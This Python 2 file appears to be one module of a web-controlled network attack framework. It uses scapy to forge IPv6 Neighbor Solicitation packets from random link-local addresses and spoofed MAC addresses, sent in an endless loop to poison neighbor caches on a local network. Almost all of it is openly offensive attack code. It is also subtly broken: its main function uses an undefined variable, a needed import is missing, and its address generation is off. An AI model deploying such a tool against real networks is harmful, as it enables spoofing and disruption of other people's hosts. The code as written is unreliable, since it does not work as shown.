from scapy.all import *
from copy import copy
import sys
from multiprocessing.pool import ThreadPool, Pool
from template import Template

sys.path.insert(0,'..')
from ipv6.ipv6 import createIPv6, get_source_address, grabRawDst, grabRawSrc, getMacAddress

class IPv6Module(Template):

    def __init__(self, socketio, namespace):
        super(IPv6Module, self).__init__(socketio, namespace)
        self.modname = "ND Cache Poisoning"
        self.actions = [
            {
                "title": "ND Cache Poisoning",
                "action": "action"
            },
            {
                "title": "ND Cache Poisoning",
                "action": "action"
            },
            {
                "title": "Stop ND Cache Poisoning",
                "action": "stop_sniffer"
            }
        ]

    def action(self, target=None):
        self.sniffer = IPv6Sniffer(self)
        self.socket_log('Sniffer intitialized.')
        self.sniffer.start()

    def stop_sniffer(self, msg):
        try:
            self.sniffer.stop()
            self.socket_log('Sniffer terminated.')
        except Exception, e:
            self.socket_log('Sniffer not yet intitialized.')

class IPv6Sniffer:
    pool = None
    stopped = False

    def __init__(self, mod):
        self.mod = mod

    # initialize the listener
    def start(self):
        print("sniffer intialized")
        self.stopped = False
        self.pool = ThreadPool(processes=1)
        self.pool.apply_async(self.send)
        # self.listen()

    # start the listener
    def send(self):
        while True:
            self.cache_poison()

    # stop the listener
    def stop(self):
        print('Stopping sniffer')
        self.stopped = True
        self.pool.close()
        self.pool.join()

    def stopfilter(self, packet):
        return self.stopped

    # callback for when packets are received
    def callback(self, packet):
        res = {}
        res['ip'] = packet[IPv6].src
        channel = False
        if ICMPv6ND_NS in packet:
            channel = 'module_output'
            try:
                self.cache_poison(packet)
            except Exception,e:
                exc_info = sys.exc_info()
                traceback.print_exception(*exc_info)
                #print e

    def cache_poison(self, dst=get_source_address(IPv6(dst="ff02::1"))):
        import random   
        M = 16**4
        src = "fe80:" + ":".join(("%x" % random.randint(0, M) for i in range(6)))
        lladdr = getMacAddress(src)

        ip_packet = createIPv6()
        ip_packet.fields["nh"] = 58 #ICMPv6
        ip_packet.fields["hlim"] = 255
        ip_packet.fields["src"] = src
        ip_packet.fields["dst"] = dst

        tgt = packet[ICMPv6ND_NS].fields["tgt"]

        solicitation = ICMPv6ND_NS()
        solicitation.fields["tgt"] = src
        
        options = ICMPv6NDOptSrcLLAddr()
        options.fields["lladdr"] = lladdr

        # TODO: Add continuous sending of this packet
        out = "ND_Cache: Poisoning Started"
        send(ip_packet/solicitation/options)
        self.mod.socket_log(out)
        print out
